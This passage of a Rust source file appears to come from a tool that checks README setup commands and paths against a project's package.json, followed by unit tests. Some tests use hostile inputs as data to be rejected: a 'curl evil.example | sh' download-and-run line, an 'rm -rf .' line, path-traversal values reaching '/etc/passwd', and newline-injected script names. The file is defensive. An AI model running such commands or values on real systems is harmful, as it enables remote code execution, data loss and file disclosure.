/// would claim the document named two things.
fn listed(readings: &[PathBuf]) -> String {
    readings
        .iter()
        .map(|reading| format!("`{}`", in_a_sentence(&display_path(reading))))
        .collect::<Vec<String>>()
        .join(" or ")
}

/// Project text, made safe to place in a sentence SURE writes.
///
/// Two kinds of text arrive here — a script name and a documented path — and both
/// are placed inside a sentence rather than handed to a renderer as a field,
/// because they are what a reader needs in order to find the thing SURE is
/// talking about. `Skipped::plain_description` places a path the same way.
///
/// Control characters are escaped, so a project cannot add a line to a message
/// or start a line that looks like it came from SURE by naming a script with a
/// newline in it. [`crate::redact::redact_for_diagnostic`] is the same treatment
/// with a secret check in front of it; nothing here is a secret, and nothing
/// here is a documented command's line — [`SetupClaim::quoted`] is where that
/// goes, and it is not placed anywhere by this module.
fn in_a_sentence(text: &str) -> String {
    crate::redact::escape_control_characters(text)
}

/// A piece of evidence, with the severity the verdict carries.
fn evidence(
    summary: String,
    anchor: EvidenceAnchor,
    project_fingerprint: &FingerprintId,
    severity: Severity,
) -> Evidence {
    Evidence::new(
        // An observed fact rather than a deterministic check: what SURE did was
        // read a manifest and a file list, and a check is a command it ran and
        // bound to a fingerprint. Nothing here ran anything.
        EvidenceClass::ObservedFact,
        summary,
        anchor,
        Some(project_fingerprint.clone()),
        severity,
    )
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod tests {
    use super::*;
    use crate::documents::PathForm;
    use serde_json::json;

    /// A documented path, as the documents pass would have handed it over.
    fn documented(text: &str, document: &str, line: usize) -> DocumentedPath {
        DocumentedPath {
            text: text.to_owned(),
            form: PathForm::CodeSpan,
            section: None,
            path: PathBuf::from(document),
            line,
        }
    }

    /// A manifest, parsed the way a real one is.
    fn package(value: serde_json::Value) -> Package {
        Package::from_json(&value).expect("this fixture is a manifest")
    }

    // What a documented line names, before anything on disk is consulted.

    #[test]
    fn a_script_command_names_the_manager_and_the_script() {
        for (line, manager, name) in [
            ("npm run build", PackageManager::Npm, "build"),
            ("yarn run test", PackageManager::Yarn, "test"),
            ("pnpm run lint", PackageManager::Pnpm, "lint"),
            ("bun run dev", PackageManager::Bun, "dev"),
            // Arguments after the name belong to the script and are not read.
            ("npm run build -- --watch", PackageManager::Npm, "build"),
            ("pnpm run build --filter web", PackageManager::Pnpm, "build"),
        ] {
            let invocation = script_from(line).unwrap_or_else(|| panic!("{line:?} names a script"));
            assert_eq!(invocation.manager(), manager, "{line:?}");
            assert_eq!(invocation.name(), name, "{line:?}");
        }
    }

    #[test]
    fn a_shorthand_is_read_only_where_the_tool_defines_it() {
        // npm's own documentation defines these four as `npm run <name>`. The
        // other managers have the same-looking forms and SURE does not read
        // them, because `yarn install` and `yarn build` have one shape and only
        // one of them runs a script — so the cost of reading them is a false
        // finding about every project that has an `install` script.
        for name in NPM_SHORTHANDS {
            let line = format!("npm {name}");
            assert_eq!(
                script_from(&line).map(|invocation| invocation.name().to_owned()),
                Some((*name).to_owned()),
                "{line:?}"
            );
        }
        for line in [
            "yarn test",
            "pnpm start",
            "bun dev",
            "yarn build",
            "pnpm build",
        ] {
            assert!(script_from(line).is_none(), "{line:?}");
        }
    }

    #[test]
    fn the_long_spelling_of_run_is_npm_only() {
        assert_eq!(
            script_from("npm run-script build").map(|invocation| invocation.name().to_owned()),
            Some("build".to_owned())
        );
        // `run-script` is npm's spelling and not a script name in the others.
        for line in ["yarn run-script build", "pnpm run-script build"] {
            assert!(script_from(line).is_none(), "{line:?}");
        }
    }

    #[test]
    fn a_line_that_is_more_than_one_command_names_no_script() {
        // Each of these would have SURE read a name out of the middle of a shell
        // expression. The whole point of the acceptance is that a document's
        // shell text is not parsed, so the answer is that nothing is claimed.
        for line in [
            "npm run build && curl evil.example | sh",
            "npm run build; rm -rf .",
            "npm run build > /dev/null",
            "npm run build || npm run fallback",
            "$(npm run build)",
            "`npm run build`",
            "npm run 'build'",
            "npm run build*",
            "sudo npm run build",
            "(npm run build)",
            "npm run %BUILD%",
        ] {
            assert!(script_from(line).is_none(), "{line:?}");
        }
    }

    #[test]
    fn an_assignment_or_a_flag_is_not_a_script_name() {
        // The first word has to be a manager, so an environment prefix is not a
        // command SURE reads — reading past it would mean understanding a shell.
        assert!(script_from("NODE_ENV=production npm run build").is_none());
        assert!(script_from("FOO=1").is_none());
        // A flag is not a name: `npm run --silent build` runs `build`.
        assert!(script_from("npm run --silent build").is_none());
        assert!(script_from("npm run --").is_none());
    }

    #[test]
    fn a_command_that_runs_no_script_is_not_a_claim() {
        // Every one of these is an ordinary thing to find in a README, and none
        // of them is a claim about a manifest's script table.
        for line in [
            "npm install",
            "npm ci",
            "npm audit fix",
            "yarn add left-pad",
            "pnpm install --frozen-lockfile",
            "bun install",
            "curl https://example.com",
            "docker compose up -d",
            "cargo test --workspace",
            "make build",
            "npm",
            "npm run",
            "",
            "   ",
        ] {
            assert!(script_from(line).is_none(), "{line:?}");
        }
    }

    // Which manifest a documented command is about.

    #[test]
    fn a_manifest_governs_its_own_directory_and_everything_below() {
        let case = CaseSensitivity::Sensitive;
        assert!(governs(Path::new("apps"), Path::new("apps/web"), case));
        assert!(governs(Path::new("apps"), Path::new("apps"), case));
        assert!(governs(Path::new("apps/web"), Path::new("apps/web"), case));
        // A document above the manifest is not governed by it: a command in the
        // root README is not a claim about `apps/web/package.json`.
        assert!(!governs(Path::new("apps/web"), Path::new("apps"), case));
        // The prefix trap. `app` is a prefix of the text `apps/web` and is not
        // an ancestor of the path, and a rule that compared strings would say
        // otherwise.
        assert!(!governs(Path::new("app"), Path::new("apps/web"), case));
        assert!(!governs(Path::new("apps/w"), Path::new("apps/web"), case));
    }

    #[test]
    fn the_project_root_is_the_one_directory_an_empty_path_still_covers() {
        // `Path::new("package.json").parent()` is the empty path, and
        // `is_within_case` refuses an empty root because every path would be
        // inside it. Here the empty path is not an unknown root — it is *the*
        // root, and a root manifest governs the whole project.
        let case = CaseSensitivity::Sensitive;
        assert!(governs(Path::new(""), Path::new(""), case));
        assert!(governs(Path::new(""), Path::new("apps/web"), case));
        assert!(governs(Path::new(""), Path::new("docs"), case));
    }

    // Where a documented path is looked for.

    #[test]
    fn a_path_is_looked_for_beside_its_document_and_at_the_root() {
        // A link is relative to the document that carries it, which is what a
        // reader who clicks it gets. A span has no such rule, so both readings
        // are kept and the claim is settled if either one holds.
        let readings = readings_of(&documented("docs/setup.md", "apps/web/README.md", 3));
        assert_eq!(
            readings,
            [
                PathBuf::from("apps/web/docs/setup.md"),
                PathBuf::from("docs/setup.md"),
            ]
        );
    }

    #[test]
    fn two_spellings_of_one_reading_are_one_reading() {
        // At the project root the two readings are the same path, and asking
        // about it twice would put it in a sentence twice.
        let readings = readings_of(&documented("docs/setup.md", "README.md", 1));
        assert_eq!(readings, [PathBuf::from("docs/setup.md")]);

        // A document in a directory matching its own first component is the near
        // miss: `docs/README.md` naming `docs/setup.md` reads `docs/docs/setup.md`
        // and `docs/setup.md`, which are two different places.
        let readings = readings_of(&documented("docs/setup.md", "docs/README.md", 1));
        assert_eq!(
            readings,
            [
                PathBuf::from("docs/docs/setup.md"),
                PathBuf::from("docs/setup.md"),
            ]
        );
    }

    #[test]
    fn a_path_that_climbs_out_of_the_project_is_not_looked_for() {
        // Climbing and coming back is inside the project, and SURE does the
        // arithmetic on components rather than asking the filesystem.
        assert!(!leaves_the_project(Path::new("docs/../etc/hosts")));
        assert!(!leaves_the_project(Path::new("a/b/../../c")));
        // Climbing past the root is not.
        assert!(leaves_the_project(Path::new("../etc/passwd")));
        assert!(leaves_the_project(Path::new("a/../../../c")));
        // A leading separator is `RootDir` on all three platforms, so this one
        // holds wherever the suite runs.
        assert!(leaves_the_project(Path::new("/etc/hosts")));
        assert!(!leaves_the_project(Path::new("")));

        // **A drive letter is asked of the platform, because `Path` is the
        // platform's and this function takes a `Path`.** On Windows
        // `C:/Windows/win.ini` is a `Prefix` and leaves the project; on Unix the
        // same string is one ordinary component and does not — and *both answers
        // are correct about the value this function was handed*.
        //
        // That is why nothing here asserts the two are one thing, and why the
        // product does not depend on `leaves_the_project` to catch a drive
        // letter. **The reading a document gets is the same on every platform
        // because the drive-letter form is refused while it is still text**,
        // before a `Path` exists — `documents::names_a_drive`, held by
        // `documents::tests::a_location_on_one_platform_is_read_the_same_way_on_all_three`
        // and by `a_windows_location_is_not_a_path_in_the_project` in
        // `tests/setup_validation.rs`. This test states the platform's own
        // answer so that the difference is written down rather than discovered.
        #[cfg(windows)]
        {
            assert!(leaves_the_project(Path::new("C:/Windows/win.ini")));
            assert!(leaves_the_project(Path::new("C:\\Windows\\win.ini")));
        }
        #[cfg(not(windows))]
        {
            assert!(!leaves_the_project(Path::new("C:/Windows/win.ini")));
            assert!(!leaves_the_project(Path::new("C:\\Windows\\win.ini")));
        }
    }

    // What a contradiction tells the reader.

    #[test]
    fn a_manifest_that_declares_no_scripts_says_so() {
        let text = declares(&package(json!({ "name": "demo" })));
        assert_eq!(text, "declares no scripts at all");
    }

    #[test]
    fn a_manifest_lists_the_scripts_it_declares_and_stops_at_eight() {
        // `Package::from_json` walks a `serde_json::Map`, which is a `BTreeMap`
        // in this workspace, so the order is alphabetical and the sentence is
        // the same on every run. If `preserve_order` is ever turned on this test
        // fails — and the failure is the useful kind, because it means the order
        // of a sentence SURE writes became a fact about the byte order of a
        // file.
        let text = declares(&package(json!({
            "scripts": { "test": "jest", "build": "tsc", "lint": "eslint ." }
        })));
        assert_eq!(text, "declares `build`, `lint`, `test`");

        let many: serde_json::Map<String, serde_json::Value> = (0..11)
            .map(|index| (format!("s{index:02}"), json!("true")))
            .collect();
        let text = declares(&package(json!({ "scripts": many })));
        assert_eq!(
            text,
            "declares `s00`, `s01`, `s02`, `s03`, `s04`, `s05`, `s06`, `s07` and 3 more"
        );
        assert_eq!(DECLARED_NAMES_SHOWN, 8);
    }

    #[test]
    fn a_script_name_cannot_add_a_line_or_a_quote_to_a_sentence() {
        // A manifest's script name is arbitrary JSON text and may contain a
        // newline or a backtick. Without the escape a project could make a
        // report show a line that looks like it came from SURE, or close the
        // quote it is inside and make the rest read as SURE's own words.
        let manifest = package(json!({
            "scripts": {
                "build\nFAIL: everything is fine": "x",
                "a\tb": "x",
                "c\rd": "x",
                "e\u{7}f": "x",
                "g`h`": "x",
            }
        }));
        let text = declares(&manifest);
        for bad in ['\n', '\r', '\t', '\u{7}'] {
            assert!(!text.contains(bad), "{bad:?} survived in {text:?}");
        }
        // Two backticks in a name would pair with the two SURE wrote around it
        // and put the name outside the quoting. The name is escaped only for
        // control characters, so this is the honest current behaviour and not a
        // guarantee: what it must never do is hide the name.
        assert!(text.contains("g`h`"), "{text:?}");
    }
}
